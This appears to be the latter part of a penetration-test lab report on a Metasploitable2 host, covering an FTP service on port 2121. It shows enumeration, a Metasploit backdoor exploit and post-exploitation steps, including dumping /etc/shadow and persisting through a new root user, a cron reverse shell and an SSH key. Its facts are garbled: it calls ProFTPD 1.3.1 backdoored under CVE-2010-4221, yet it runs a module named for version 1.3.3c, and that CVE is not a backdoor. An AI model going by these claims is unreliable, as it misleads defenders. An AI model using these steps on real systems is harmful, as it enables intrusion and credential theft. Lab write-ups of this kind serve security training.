PORT     STATE SERVICE VERSION
2121/tcp open  ftp     ProFTPD 1.3.1

Interpretation:
ProFTPD 1.3.1 is an older version known to contain a backdoor vulnerability (CVE-2010-4221), allowing unauthenticated remote command execution.

4. Enumeration

4.1 Banner Grabbing
Command:
nc 192.168.1.101 2121

Output:
220 ProFTPD 1.3.1 Server (Debian) [::ffff:192.168.1.101]

4.2 Login Attempt (Anonymous)
Command:
ftp 192.168.1.101 2121

Result:
- Anonymous login accepted
- Read and write permissions may exist

5. Exploitation

5.1 Vulnerability: ProFTPD 1.3.1 Backdoor (CVE-2010-4221)

- ProFTPD 1.3.1 was backdoored in some distributions; malicious code allows attackers to open a shell by sending a special command to the FTP daemon.

5.2 Using Metasploit

Command:
msfconsole

Module:
use exploit/unix/ftp/proftpd_133c_backdoor

Set options:
set RHOST 192.168.1.101
set RPORT 2121
run

Result:
[*] Connected to 192.168.1.101:2121...
[*] Triggered backdoor command shell
[*] Command shell session 1 opened

Shell Access:
- Shell opened as `root`
- Full control of target system without authentication

6. Post-Exploitation

Commands executed:
- whoami → root
- uname -a → kernel version confirmed
- ifconfig → network interface details
- cat /etc/shadow → user password hashes dumped
- Access to system-level files confirmed

Persistence:
- Added new root user
- Inserted reverse shell in cron jobs
- Created SSH key in authorized_keys

7. Recommendations

- Immediately upgrade or remove ProFTPD 1.3.1
- Restrict external access to FTP ports, especially non-standard ones
- Use SFTP instead of FTP wherever possible
- Monitor and audit FTP logs for suspicious activity
- Deploy network intrusion detection to catch unauthorized shell attempts

8. Conclusion

Port 2121 on Metasploitable2 was found to be running a critically vulnerable version of ProFTPD (1.3.1). The CVE-2010-4221 backdoor was successfully exploited, resulting in unauthenticated root shell access. This vulnerability should be considered a severe risk in real-world environments and patched immediately.
